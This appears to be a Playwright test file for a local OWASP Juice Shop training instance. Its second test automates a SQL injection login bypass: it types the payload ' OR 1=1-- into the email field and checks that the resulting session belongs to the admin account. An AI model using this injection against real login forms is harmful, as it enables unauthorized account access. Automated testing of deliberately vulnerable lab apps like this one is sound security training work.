import { test, expect } from '@playwright/test';

test('has title', async ({ page }) => {
  await page.goto('http://localhost:3000/');

  // Expect a title "to contain" a substring.
  await expect(page).toHaveTitle(/OWASP Juice Shop/);
});

test('SQL Injection login', async ({ page }) => {
  await page.goto('http://localhost:3000/');

  const welcome_banner = "xpath=//button[@aria-label='Close Welcome Banner']";
  const account_menu = "xpath=//button[@aria-label='Show/hide account menu']";
  const go_to_login = "xpath=//button[@aria-label='Go to login page']";
  const email_field = "xpath=//input[@aria-label='Text field for the login email']";
  const password_field = "xpath=//input[@aria-label='Text field for the login password']";
  const login_button = "xpath=//button[@aria-label='Login']";
  const user_profile_button = "//button[@aria-label='Go to user profile']";

  const sql_injection_query = "' OR 1=1--";
  const fake_password = "123";
  const admin_email = "admin@juice-sh.op";

  await page.locator(welcome_banner).click();
  await page.locator(account_menu).click();
  await page.locator(go_to_login).click();

  await page.locator(email_field).click();
  await page.locator(email_field).fill(sql_injection_query);

  await page.locator(password_field).click();
  await page.locator(password_field).fill(fake_password);

  await page.locator(login_button).click();

  await page.locator(account_menu).click();

  const text = await page.locator(user_profile_button).innerText();

  expect(text).toContain(admin_email);

  
});
